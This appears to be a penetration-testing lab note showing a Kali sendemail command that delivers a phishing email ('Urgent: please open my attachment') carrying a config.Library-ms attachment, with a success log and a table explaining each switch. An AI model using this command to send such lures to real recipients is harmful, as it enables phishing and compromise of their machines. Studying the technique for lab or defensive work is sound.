# sendemail
- send an email from KALI command line
```bash
sendemail -f test@supermagicorg.com -t Dave.Wizard@supermagicorg.com -s 192.168.205.199:587 -xu test@supermagicorg.com -xp test -u "Urgent: please open my attachment" -m "Urgent: please open my attachment." -a ./config.Library-ms  -o tls=yes
Oct 23 00:23:10 kali sendemail[1090229]: Email was sent successfully!

```
Switch,Value,Description
-f,test@supermagicorg.com,Specifies the From email address (the sender).
-t,Dave.Wizard@supermagicorg.com,Specifies the To email address (the recipient).
-s,192.168.205.199:587,Specifies the SMTP server address (192.168.205.199) and port (587).
-xu,test@supermagicorg.com,Specifies the Username for SMTP authentication.
-xp,test,Specifies the Password for SMTP authentication.
-u,"""Urgent: please open my attachment""",Specifies the Subject line of the email.
-m,"""Urgent: please open my attachment.""",Specifies the Message body (content) of the email.
-a,./config.Library-ms,Specifies the path to the Attachment file to be included.
-o,tls=yes,"Specifies an Option; in this case, it forces the use of TLS (Transport Layer Security) for a secure connection."
